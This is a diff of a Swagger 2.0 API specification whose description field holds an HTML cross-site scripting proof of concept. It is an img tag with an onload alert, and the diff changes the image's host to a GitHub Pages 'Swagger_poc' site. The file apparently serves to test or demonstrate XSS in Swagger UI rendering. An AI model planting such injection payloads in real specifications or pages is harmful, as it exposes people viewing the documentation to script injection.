@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <h3>Script Executed</h3><img src="https://candid-sunflower-7f866d.netlify.app/company.jpg" onload="alert('XSS')">
+  description: <h3>Script Executed</h3><img src="https://manojhodal.github.io/Swagger_poc/company.jpg" onload="alert('XSS')">
 
   version: production
 basePath: /
